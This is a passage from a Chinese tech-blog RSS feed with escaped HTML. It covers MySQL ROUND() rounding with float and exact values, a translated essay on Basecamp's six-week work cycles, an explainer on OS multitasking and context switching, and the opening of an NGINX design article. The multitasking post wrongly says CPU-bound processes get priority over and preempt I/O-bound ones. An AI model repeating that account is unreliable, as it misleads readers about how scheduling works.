&lt;span class=&quot;crayon-h&quot;&gt;         &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;field5&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;4&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9f4b3d6cc781361111-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;         &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;field6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9f4b3d6cc781361111-10&quot;&gt;
&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;row &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0.00&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sec&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0030 seconds] --&gt;
&lt;p&gt;&lt;/p&gt;
&lt;h2 id=&quot;toc_1&quot;&gt;为什么会这样？&lt;/h2&gt;
&lt;p&gt;同样是100*1.005，为什么从数据库中的字段相乘得到的结果和直接字段与小数相乘得到的不一样呢？&lt;/p&gt;
&lt;p&gt;对这个问题百思不得其解，各种百度谷歌无果。。。没办法，还得靠自己，这个时候最有用的就是官网文档了，于是查询了mysql官方文档中关于ROUND函数的部分，其中包含下面两条规则&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;For exact-value numbers, ROUND() uses the “round half up” rule（对于精确的数值，&lt;code&gt;ROUND&lt;/code&gt;函数使用四舍五入）&lt;/li&gt;
&lt;li&gt;For approximate-value numbers, the result depends on the C library. On many systems, this means that ROUND() uses the “round to nearest even” rule: A value with any fractional part is rounded to the nearest even integer. （对于近似值，则依赖于底层的C函数库，在很多系统中&lt;code&gt;ROUND&lt;/code&gt;函数会使用“取最近的偶数”的规则）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过这两条规则，我们可以看出，由于我们在使用两个字段相乘的时候，最终的结果是按照&lt;code&gt;float&lt;/code&gt;类型处理的，而在计算机中&lt;code&gt;float&lt;/code&gt;类型不是精确的数，因此处理结果会按照第二条来，而直接整数字段与1.005这样的小数运算的结果是因为两个参与运算的值都是精确数，因此按照第一条规则计算。从&lt;code&gt;field5&lt;/code&gt;和&lt;code&gt;field6&lt;/code&gt;执行&lt;code&gt;ROUND&lt;/code&gt;函数的结果可以明确的看确实是转换为了最近的偶数。&lt;/p&gt;
&lt;h2 id=&quot;toc_2&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;从这个例子中可以看到，在MySQL中使用ROUND还是要非常需要注意的，特别是当参与计算的字段中包含浮点数的时候，这个时候计算结果是不准确的。&lt;/p&gt;
&lt;p&gt;本文将会持续修正和更新，最新内容请参考我的 GITHUB 上的 &lt;a href=&quot;https://github.com/mylxsw/growing-up&quot;&gt;程序猿成长计划&lt;/a&gt; 项目，欢迎 Star，另外，求&lt;a href=&quot;https://github.com/mylxsw&quot;&gt;follow&lt;/a&gt;😂。&lt;/p&gt;

        
            &lt;blockquote class=&quot;rewards&quot;&gt;
        &lt;p&gt;&lt;strong&gt;打赏支持我写出更多好文章，谢谢！&lt;/strong&gt;&lt;/p&gt;
        &lt;a href=&quot;#rewardbox&quot; id=&quot;rewards-button&quot; class=&quot;fancybox&quot;&gt;&lt;span class=&quot;btn-bluet-blue href-style&quot;&gt;&lt;i class=&quot;fa fa-jpy&quot;&gt;&lt;/i&gt; 打赏作者&lt;/span&gt;&lt;/a&gt;
    &lt;/blockquote&gt;

    &lt;div id=&quot;rewardbox&quot;&gt;
        &lt;h4&gt;打赏支持我写出更多好文章，谢谢！&lt;/h4&gt;
                &lt;p&gt;任选一种支付方式&lt;/p&gt;
                
    &lt;/div&gt;

    
        
    &lt;div class=&quot;post-adds&quot;&gt;
        &lt;span data-post-id=&quot;109735&quot; class=&quot; btn-bluet-bigger href-style vote-post-up   register-user-only &quot;&gt;&lt;i class=&quot;fa  fa-thumbs-o-up&quot;&gt;&lt;/i&gt; &lt;h10 id=&quot;109735votetotal&quot;&gt;1&lt;/h10&gt; 赞&lt;/span&gt;
        &lt;span data-book-type=&quot;1&quot; data-site-id=&quot;2&quot; data-item-id=&quot;109735&quot; data-item-type=&quot;1&quot; class=&quot; btn-bluet-bigger href-style bookmark-btn  register-user-only &quot;&gt;&lt;i class=&quot;fa fa-bookmark-o  &quot;&gt;&lt;/i&gt; 1 收藏&lt;/span&gt;

                    &lt;a href=&quot;#article-comment&quot;&gt;&lt;span class=&quot;btn-bluet-bigger href-style hide-on-480&quot;&gt;&lt;i class=&quot;fa fa-comments-o&quot;&gt;&lt;/i&gt;  评论&lt;/span&gt;&lt;/a&gt;
        
        
        
        &lt;!-- JiaThis Button BEGIN --&gt;
        &lt;div class=&quot;jiathis_style_24x24&quot; style=&quot;display: inline-flex; position: relative; margin: 0; clear: both;float: right;&quot;&gt;
            &lt;a class=&quot;jiathis_button_tsina&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_weixin&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_qzone&quot;&gt;&lt;/a&gt;
            &lt;a class=&quot;jiathis_button_fb hide-on-480&quot;&gt;&lt;/a&gt;
            &lt;a href=&quot;http://www.jiathis.com/share?uid=1745061&quot; class=&quot;jiathis jiathis_txt jiathis_separator jtico jtico_jiathis&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;
        &lt;/div&gt;

    &lt;/div&gt;




        &lt;!-- BEGIN #author-bio --&gt;

&lt;div id=&quot;author-bio&quot;&gt;
	
	&lt;h3 class=&quot;widget-title&quot;&gt;
	关于作者：&lt;a target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/mylxsw&quot;&gt;管宜尧&lt;/a&gt;
	&lt;/h3&gt;
	&lt;div class=&quot;alignleft&quot;&gt;
		&lt;a target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/mylxsw&quot;&gt;
			&lt;img src=&quot;/images/jobbole.com/c510273921962744d05b6613c1369155.jpg&quot;&gt;
		&lt;/a&gt;
	&lt;/div&gt;

    &lt;div class=&quot;author-bio-info&quot;&gt;

        &lt;span class=&quot;author-bio-info-block&quot;&gt;
            PHP程序猿，常用网络ID为mylxsw，具有6年以上PHP研发经验，专注于PHP，Golang以及Linux生态、微服务架构等方向，对技术比较执着，经常会写一些博文分享自己的所学，目前就职于重庆允升科技有限公司。        &lt;/span&gt;
        &lt;span class=&quot;author-bio-info-block&quot;&gt;
            &lt;a href=&quot;http://www.jobbole.com/members/mylxsw&quot; target=&quot;_blank&quot;&gt;&lt;i class=&quot;fa fa-user&quot;&gt;&lt;/i&gt; 个人主页&lt;/a&gt; ·
            &lt;a href=&quot;http://blog.jobbole.com/author/mylxsw/&quot; target=&quot;_blank&quot;&gt;&lt;i class=&quot;fa fa-file-text-o&quot;&gt;&lt;/i&gt; 我的文章&lt;/a&gt;

             · &lt;a title=&quot;声望值&quot; target=&quot;_blank&quot; href=&quot;http://www.jobbole.com/members/mylxsw/reputation/&quot;&gt;&lt;i class=&quot;fa fa-graduation-cap&quot;&gt;&lt;/i&gt; 3&lt;/a&gt; · &lt;a title=&quot;我的网站&quot; target=&quot;_blank&quot; href=&quot;https://aicode.cc&quot;&gt;&lt;i class=&quot;fa fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt; &lt;a title=&quot;微博主页&quot; target=&quot;_blank&quot; href=&quot;http://weibo.com/code404&quot;&gt;&lt;i class=&quot;fa fa-weibo&quot;&gt;&lt;/i&gt;&lt;/a&gt; &lt;a title=&quot;GitHub主页&quot; target=&quot;_blank&quot; href=&quot;https://github.com/mylxsw&quot;&gt;&lt;i class=&quot;fa fa-github&quot;&gt;&lt;/i&gt;&lt;/a&gt;         &lt;/span&gt;
    &lt;/div&gt;
	&lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;!-- END #author-bio --&gt;
	

</description>
        <pubDate>Mon, 09 Jan 2017 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2017/2017-01-09-109735-37964e8d2.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2017/2017-01-09-109735-37964e8d2.html</guid>
        
        
        <category>jobbole</category>
        
      </item>
    
      <item>
        <title>我们在Basecamp如何组织工作和团队</title>
        <description>

	
	

	&lt;p&gt;原文： &lt;a href=&quot;https://m.signalvnoise.com/how-we-set-up-our-work-cbce3d3d9cae#.uwvu65vwu&quot;&gt;https://m.signalvnoise.com/how-we-set-up-our-work-cbce3d3d9cae#.uwvu65vwu&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/weizhifeng.net/e0f267a313ea5ce0e7a571a2673fa807.jpg&quot; alt=&quot;cover&quot; title=&quot;cover&quot;&gt;&lt;/p&gt;

&lt;p&gt;编者按：作者Jason Fried，Basecamp创始人兼CEO。《Getting Real》、《Remote》以及《重来》等书的共同作者。&lt;/p&gt;

&lt;p&gt;「你们这些家伙到底是怎么工作的？你们怎么决定到底做什么？你们团队多大？你们如何组织工作本身」这些问题我整天看到。我已经在一些小型的研讨会上分享过一些细节，是一对一的分享，考虑是时候写点东西跟大家详细的分享一下了。&lt;/p&gt;

&lt;p&gt;我们现在使用的工作流程是经过十年的提炼而成的。就像我们一直迭代我们的产品一样，我们也在一直迭代我们公司的工作方式。我们把我们的公司也当成一个产品。当你开始把你的公司当作产品来对待的时候，你就可以用新的方式来改进它。我觉得我们正在使用「我们如何工作」v5.2版本。&lt;/p&gt;

&lt;p&gt;让我们看一下：&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;我们以六个礼拜为一个周期进行工作&lt;/h2&gt;

&lt;p&gt;大概每六个礼拜我们就开始一个新的产品迭代周期。每六个礼拜的迭代周期中包含两种类型的项目：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Big Batch：Big Batch项目指的是很复杂的功能或者其他需要花费六个礼拜才能搞定的事情。通常情况下我们会在一个为期六个礼拜的迭代周期内处理一个或者两个Big Batch项目。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Small Batch：Small Batch项目指的是一些小事情，调整，优化，以及其他比较容易的，在一天到两周内可以完成的事情。我们通常在六个礼拜的迭代周期内进行4到8个 Small Batch项目。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;为了让你能够对项目大小的定义有个认识，&lt;a href=&quot;https://public.3.basecamp.com/p/yCe87HJ5EX1Nx48N3R6fhfHX&quot;&gt;这儿有一篇内部文章介绍了在迭代周期里边要做的事情&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;当为期六个礼拜的迭代结束之后，我们会暂停日程表中的项目，拿出一到两周的时间给每个人独立支配，这段时间可以用来修复一些问题，做一些自己感兴趣的小项目，通常情况下是在开始下一个迭代周期之前放松放松自己。给大家足够的时间来进行工作切换。我们也会用这段时间来坚定我们下个迭代要做的事情。通常做这件事会比较多。&lt;/p&gt;

&lt;p&gt;注意：我们不用冲刺（sprints）。我讨厌冲刺（sprints）这个词。冲刺和工作是相互冲突的。我们不是以最快的速度奔跑，而是以合适的速度冷静的工作，并且在工作过程中出明智的决定。我们不会用蛮力，不会使我们团队疲于奔命。&lt;/p&gt;

&lt;h2 id=&quot;section-1&quot;&gt;六个礼拜…如果有的事情所需的时间超过了六个礼拜怎么办？&lt;/h2&gt;

&lt;p&gt;我们相信几乎所有事情都可以提炼出一个六个礼拜的版本。偶尔会有事情超过这个时间限制 - 比如需要大力研发的项目，我们之前没用过的新技术，等等。但是我门发现几乎所有事情中的重要部分都可以在六个礼拜左右完成。而且完成的不错。&lt;/p&gt;

&lt;p&gt;能实现这个的奥秘我们内部称为范围锻造（scope hammering）。我们会先审视一个很大的需求，把这个功能提炼成一个在六个礼拜内能实现的最优版本。主要的工作就是审视这个功能，了解它的本质。问题的关键不是这个功能能做成什么样，而是应该要做成什么样。&lt;/p&gt;

&lt;p&gt;在迭代开始之前，我们对项目为期六个礼拜的版本是什么样子已经心里有数。迭代周期不包括计划所花的时间 - 所有计划和思考在讨论（pitch）阶段完成。这个事情必须在团队启动前完成。如此一来这六个礼拜都可以用来实现功能和执行。不会有时间会被浪费在处理未知的大坑上 - 我们尽量在启动之前确保所有重要的事情大家都明了。&lt;/p&gt;

&lt;h2 id=&quot;section-2&quot;&gt;工作如何分配？&lt;/h2&gt;

&lt;p&gt;每个Big Batch项目会分配给一个团队。所以如果我们在一个迭代周期内要处理两个Big Batch项目，我们将会用一个团队处理其中一个项目，然后另一个团队处理另一个。Small Batch项目都由同一个团队完成。在整个迭代周期内所有团队都会并肩作战。&lt;/p&gt;

&lt;p&gt;一个团队两到三个人，大小取决于工作的性质。一个程序员和一个设计师，或者两个程序员和一个设计师。基本就这样。不会有四个、五个或六个人组成的团队。我们处理的所有事情都是由三人团队完成的，人数不会超过这个。&lt;/p&gt;

&lt;p&gt;我们认为3是所有事情的理想大小 - 超过这个大小事情的复杂度将会呈指数型增长。&lt;/p&gt;

&lt;p&gt;团队都是临时组建。在迭代开始之前，我们会询问每个人接下来的六个礼拜他们想做什么类型的工作。团队按照员工的兴趣自由组建，或者我们会把成员按照他们的喜好分配到一个团队中。团队在迭代完成之后一般都会发生变动，所以每个人都有机会跟不同的人一起工作，但是有的时候团队在几个迭代中都没有变化。对此没有硬性规定。&lt;/p&gt;

&lt;h2 id=&quot;section-3&quot;&gt;我们有专门的项目经理吗？&lt;/h2&gt;

&lt;p&gt;没有。团队中的设计师领导这个项目，但是设计师和程序员（们）之间有着非常紧密的工作关系。他们在每件事上都一起处理。&lt;/p&gt;

&lt;p&gt;项目角色不重要，每个人都在相同的地方追踪工作、沟通等等。对于我们来说这个地方就是Basecamp 3。当所有的事情都放在一个地方，每个人都知道事情在哪，进展如何，并且可以自给自足。把工作、沟通以及管理通过不同的工具或产品割裂开来：一非常低效，二团队成员想了解项目的整体情况非常难。&lt;/p&gt;

&lt;h2 id=&quot;section-4&quot;&gt;你们会跟踪时间吗？&lt;/h2&gt;

&lt;p&gt;不会。我们不会去度量效率，不会把实际情况和计划做比较。我们会在六个礼拜内完成一些事情。在这段时间内如何完成它由团队自己来决定。&lt;/p&gt;

&lt;p&gt;重点是我们不会一口气跑到终点然后发现我们超时了。我们会一直留意什么已经完成了，什么还没完成，还剩下多少时间。工作范围永远都在变化 - 如果我们时间不够了就缩小一些，如果我们发现我们的时间比想象的要多就扩大一些。这是可以协商的。这个过程非常弹性。但是deadline不能有弹性 - 从我们启动向后数六个礼拜。&lt;/p&gt;

&lt;h2 id=&quot;section-5&quot;&gt;想法从哪里来？&lt;/h2&gt;

&lt;p&gt;我们没有单独的时间用来讨论想法。也没有单独的人来提出想法。想法来自所有人，并且可以随时提出。它们来自于我们自己，它们来自于客户。想法是一直在变的。我们会一直有一个由想法组成的泡泡海洋。当一有泡泡从海洋中浮出落在岸边，这时我们会开始审视这个想法。（译者：比喻手法）&lt;/p&gt;

&lt;h2 id=&quot;pitch&quot;&gt;阐述（pitch）一个想法&lt;/h2&gt;

&lt;p&gt;当一个想法足够成熟之后，就可以拿出来进行讨论了。pitch的意思是对问题进行全面的定义，同时也包括预期的处理方案。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://public.3.basecamp.com/p/22KB2DCxpEQLZow8Vc2iJhEq&quot;&gt;这有一个真实pitch的例子&lt;/a&gt;，所以你可以了解一下它们的一般形式。我们不会亲自pitch - 我们都是把pitch写下来，然后发到Basecamp上用来review。&lt;/p&gt;

&lt;p&gt;为什么我们不亲自pitch？有几个原因：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;我们觉得完整地写下一些事情更好。这样可以保证正在进行pitch的人不会被打断。他们能够随心所欲的完整的表达他们想说的。&lt;/li&gt;
  &lt;li&gt;除此之外，我们相信把东西写出来能够让你对事情有更高程度的认识。&lt;/li&gt;
  &lt;li&gt;我们是异步交流的忠实信徒 - 先写下来，然后其他人在他们有空的时候会去看的。面对面实时沟通或者强制按照日程安排来做非常低效。&lt;/li&gt;
  &lt;li&gt;最后，当问题以消息的形式发到Basecamp上的时候，所有反馈和相关的问题会自动添加到原始问题上。这保证了和pitch相关的所有的沟通都在同一个地方进行，所以每个人访问到的内容是一样的。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;section-6&quot;&gt;你们如何决定到底要做哪个项目&lt;/h2&gt;

&lt;p&gt;大家都对这个很好奇。真相是感性胜于理性。想法来自于所有人，但是在迭代里边做什么最终由我 (ceo), David (cto), and Ryan (战略官)来决定。提前一周或者在接近迭代开始的时候，我们会review Basecamp上所有的pitch，也会分享一些我们自己的想法，并且通常会激烈讨论到底做什么。之后我们经常会开30分钟的电话会议(Skype or Hangout) ，再做一些讨论，然后做出最终决定。&lt;/p&gt;

&lt;p&gt;最终的决定取决于很多因素 - 之前pitch完成度如何，客户痛点，尝试新的想法，员工觉得有的功能不好用需要优化，潜在商业机会，等等。但是无论决定是什么，好消息是六个礼拜后我们又可以重新开始新一个迭代的工作。所以如果有些事情这个迭代没加进去，一个半月之后就可以继续评估。&lt;/p&gt;

&lt;h2 id=&quot;section-7&quot;&gt;如何向团队宣布本迭代的计划？&lt;/h2&gt;

&lt;p&gt;一旦这个迭代定义好了，并且要做的事情已经分到了Big Batch和Small Batch工程中之后，我会写一个声明并发布到Basecamp上的「Building BC3」项目中。Building BC3这个项目是与Basecamp相关的高级产品工作的主项目。我们会在那里谈论大的远景，分享pitch，讨论想法，规划迭代，等等。&lt;a href=&quot;https://public.3.basecamp.com/p/yCe87HJ5EX1Nx48N3R6fhfHX&quot;&gt;这有一个迭代声明的例子&lt;/a&gt;（这个跟之前我在链接中给出的是一样的，如果你之前没看到可以在这里看）。&lt;/p&gt;

&lt;h2 id=&quot;section-8&quot;&gt;实际工作是如何组织的？&lt;/h2&gt;

&lt;p&gt;每个Big Batch项目都会对应一个Basecamp项目。这里有一个Big Batch项目的模版。注意：Blackburn是这个迭代的名字（我们以山脉命名迭代）…..&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/weizhifeng.net/0f1e9dfef842365bfd1be216686b37ff.jpg&quot; alt=&quot;001&quot; title=&quot;001&quot;&gt;&lt;/p&gt;

&lt;p&gt;(每个任务，讨论，评论，声明，截止日期，注释，以及围绕着模版进行的聊天都在这同一个项目中进行。)&lt;/p&gt;

&lt;p&gt;一个迭代中所有的Small Batch项目都放在同一个单独的项目中。这有一个例子，包括Blackburn迭代中所有的Small Batch：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/weizhifeng.net/f0137bb79472eb4b805ca4f6f4c6e722.jpg&quot; alt=&quot;002&quot; title=&quot;002&quot;&gt;&lt;/p&gt;

&lt;p&gt;每个Small Batch项目通过一个独立to-do列表来管理。下面是Blackburn迭代中的四个Small Batch项目：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/weizhifeng.net/c20c31f1df687b717f8f75d399494660.jpg&quot; alt=&quot;003&quot; title=&quot;003&quot;&gt;
（每个设计工作，编码工作，以及QA内容都放在一个独立的to-do列表里边，列表以我们正在进行开发的功能的名称来命名。这种工作方式整个团队 - 不管什么角色 - 都知道事情进展得怎么样了。）&lt;/p&gt;

&lt;h2 id=&quot;qa&quot;&gt;QA如何工作？&lt;/h2&gt;

&lt;p&gt;我们QA团队有两个成员：Ann和Michael。她们在正在进行的项目之间游走，当有的团队希望验证一些功能的时候会邀请她们加入。我们发现她们越早介入越好。QA也适用六个礼拜的时间窗口，所以不会由于在最后一分钟发现一大堆bug而导致延期。这就是为什么我们不会等到最后才启动QA。至少大多数情况下是这样。&lt;/p&gt;

&lt;h2 id=&quot;david&quot;&gt;你和David如何参与？&lt;/h2&gt;

&lt;p&gt;David和我（Jason）以某种程度参与到几乎每个面向用户的项目以及产品更新。&lt;/p&gt;

&lt;p&gt;我和设计师一起探索早期的想法，然后帮助提炼和简化我们将要做的事情。我也和设计师一起处理文案 - 确保我们使用的词句别人看得懂。Design review不是用来批评谁的，而是用来解决问题的。&lt;/p&gt;

&lt;p&gt;David帮助程序员制定开发计划 - 思考数据模型，把团队精力聚焦在性能和速度上，并协商做一些技术妥协，以便技术工作在六个礼拜内能够完成。&lt;/p&gt;

&lt;p&gt;再提一句，我们也都会参与产品规划 - pitch 想法，决定下个迭代要做什么。我们和Ryan紧密合作，思考每个功能，并且从整体上审视产品，找出最佳的行动时机。&lt;/p&gt;

&lt;h2 id=&quot;section-9&quot;&gt;当然还有很多没聊的&lt;/h2&gt;

&lt;p&gt;我尝试过把主要的内容列个提纲，但是我确信这样做肯定会存在信息沟通不畅。这是毋容置疑的 - 产品工作很大程度上依赖于灵感。当然，希望这里提供的信息能让你对Basecamp的工作方式有一个大体上的印象。&lt;/p&gt;

&lt;p&gt;如果你有一些具体的问题，或者希望了解一些我上面没讲到的东西，请留言，然后我们会尽最大能力回答大家。感谢阅读 - 我知道文章挺长的！&lt;/p&gt;

    （全文完）

	&lt;!-- disqus start --&gt;
	
	
	
	
	&lt;!-- disqus end --&gt;

	&lt;!-- related start --&gt;
	
	&lt;!-- related end --&gt;

</description>
        <pubDate>Thu, 15 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2016/2016-12-15-how-we-set-up-our-work.html-40e5c1025.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2016/2016-12-15-how-we-set-up-our-work.html-40e5c1025.html</guid>
        
        
        <category>weizhifeng</category>
        
      </item>
    
      <item>
        <title>操作系统多任务</title>
        <description>

	
	

	&lt;p&gt;&lt;img src=&quot;/images/weizhifeng.net/52be2578b6d5290024fc4c8d064445ac.jpg&quot; alt=&quot;multiple-processes&quot; title=&quot;multiple-processes&quot;&gt;&lt;/p&gt;

&lt;p&gt;我们知道每个CPU在同一个时间内只能运行一个任务（进程），但是现实生活中我们需要计算机可以同时运行多个任务，
比如你在用文字编辑器写文章的时候想要同时听音乐。多进程实现了计算机同时执行多个任务的目标。
（注：本文以每台计算机只有一个CPU为例来进行讨论，多CPU或者多核以后再讨论）&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;多进程&lt;/h2&gt;

&lt;p&gt;多进程就是指操作系统把CPU的执行时间通过某种调度（scheduling）规则来进行分配，让多个进程都能获得执行的机会，
从而看起来好像多个进程在同时执行，实际上这是一种幻觉。&lt;/p&gt;

&lt;h2 id=&quot;section-1&quot;&gt;调度方式&lt;/h2&gt;

&lt;h3 id=&quot;cooperative&quot;&gt;合作式（Cooperative）&lt;/h3&gt;

&lt;p&gt;进程主动（定期或者空闲时候）让出CPU的执行时间给其他进程来执行，这种模式非常依赖于程序的设计，如果程序写的很差，
进程长时间占用CPU的执行时间（大量计算密集型的操作或者等待外设等），这会让其他进程没有机会执行，从而造成整个操作系统失去响应。&lt;/p&gt;

&lt;p&gt;合作式多任务在早期的操作系统中使用得比较广泛（比如Windows 9x、&lt;a href=&quot;https://en.wikipedia.org/wiki/Classic_Mac_OS&quot;&gt;Classic Mac OS&lt;/a&gt;等等）。&lt;/p&gt;

&lt;h3 id=&quot;preemptive&quot;&gt;抢占式（Preemptive）&lt;/h3&gt;

&lt;p&gt;操作系统把CPU的时间划分成一个一个的&lt;a href=&quot;http://stackoverflow.com/questions/16401294/how-to-know-linux-scheduler-time-slice&quot;&gt;时间片&lt;/a&gt;（毫秒级），抢占式多任务保证每个进程都能获得一个CPU时间片来执行。&lt;/p&gt;

&lt;p&gt;什么叫做抢占呢？任何时间每个进程都可以被分为两种类型：I/O密集型（I/O bound）和CPU密集型（CPU bound）。CPU密集型的进程拥有比
I/O密集型进程拥有更高的优先级来得到CPU时间片，甚至从当前正在执行的I/O密集型进程手中抢来CPU时间。比如：&lt;/p&gt;

&lt;p&gt;process a正在自己的时间片内执行，执行过程中需要等待外设，比如磁盘（I/O密集型），此时CPU的资源是被浪费的，而此时操作系统发现process b是个CPU密集型的进程，那么操作系统就可以把process a这个进程暂停，把这个CPU时间片交给process b来执行，这就是CPU抢占。&lt;/p&gt;

&lt;p&gt;现代操作系统都支持抢占式多任务，包括Windows、macOS、Linux（包括Android）和iOS。&lt;/p&gt;

&lt;h2 id=&quot;section-2&quot;&gt;上下文切换&lt;/h2&gt;

&lt;p&gt;如果在当前时间片，CPU正在执行process a，当这个时间片结束之后，操作系统决定要让process b执行，那么操作系统将process a暂停，
并把process a的执行状态进行暂存，然后让process b在CPU上运行。当process b的时间片结束后，操作系统决定要让process a继续执行，
此时会把process a暂存的进程状态恢复，然后继续process a的执行。这种进程之间相互切换的过程叫做进程上下文切换。&lt;/p&gt;

&lt;p&gt;由于时间片非常短，这种上下文切换的频率非常快，所以就给人一种错觉，好像多个进程在同时执行一样。&lt;/p&gt;

&lt;h3 id=&quot;section-3&quot;&gt;切换过程&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/images/weizhifeng.net/f4bd2da9500938f5d377b4079ecd348c.jpg&quot; alt=&quot;context-switch&quot; title=&quot;context-switch&quot;&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;当上下文切换发生的时候，操作系统把旧进程的状态进行保存，进程状态包括CPU寄存器、栈指针、&lt;a href=&quot;https://en.wikipedia.org/wiki/Program_counter&quot;&gt;程序计数&lt;/a&gt;以及其他操作系统数据。这些数据会被存储
在一个叫做&lt;a href=&quot;https://en.wikipedia.org/wiki/Process_control_block&quot;&gt;PCB&lt;/a&gt;（process control block）的数据结构中。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;把指向这个PCB的handle加入到ready queue队列中。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;当操作系统想要继续执行旧的进程，从ready queue中得到旧进程PCB的handle，然后从PCB中读取出进程状态，从而继续执行旧进程。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;上下文切换会造成一定的系统开销，这种开销会在处理高并发的网络请求的时候产生性能问题。这也是Apache性能较Nginx差的&lt;a href=&quot;/inside-nginx-how-we-designed-for-performance-scale.html&quot;&gt;原因&lt;/a&gt;之一。&lt;/p&gt;

&lt;h2 id=&quot;section-4&quot;&gt;参考&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Computer_multitasking&quot;&gt;https://en.wikipedia.org/wiki/Computer_multitasking&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Preemption_(computing)&quot;&gt;https://en.wikipedia.org/wiki/Preemption_(computing)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Context_switch&quot;&gt;https://en.wikipedia.org/wiki/Context_switch&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

    （全文完）

	&lt;!-- disqus start --&gt;
	
	
	
	
	&lt;!-- disqus end --&gt;

	&lt;!-- related start --&gt;
	
	&lt;!-- related end --&gt;

</description>
        <pubDate>Sat, 03 Dec 2016 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2016/2016-12-03-multiple-processes.html-1de93dcae.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2016/2016-12-03-multiple-processes.html-1de93dcae.html</guid>
        
        
        <category>weizhifeng</category>
        
      </item>
    
      <item>
        <title>深入NGINX - 面向性能和扩展性进行设计</title>
        <description>

	
	

	&lt;p&gt;&lt;img src=&quot;/images/weizhifeng.net/024cc4d8d813f48e0b91dec94169e873.jpg&quot; alt=&quot;NGINX&quot; title=&quot;NGINX&quot;&gt;&lt;/p&gt;

&lt;p&gt;原文：&lt;a href=&quot;https://www.nginx.com/blog/inside-nginx-how-we-designed-for-performance-scale/&quot;&gt;https://www.nginx.com/blog/inside-nginx-how-we-designed-for-performance-scale/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;NGINX在性能上傲视群雄，这都归结于它的设计理念。很多web服务器和应用服务器都采用多线程或者基于进程的架构，NGINX通过采用复杂的事件驱动架构而脱颖而出，这种架构可以在当今的硬件上支持数十万的并发连接。&lt;/p&gt;

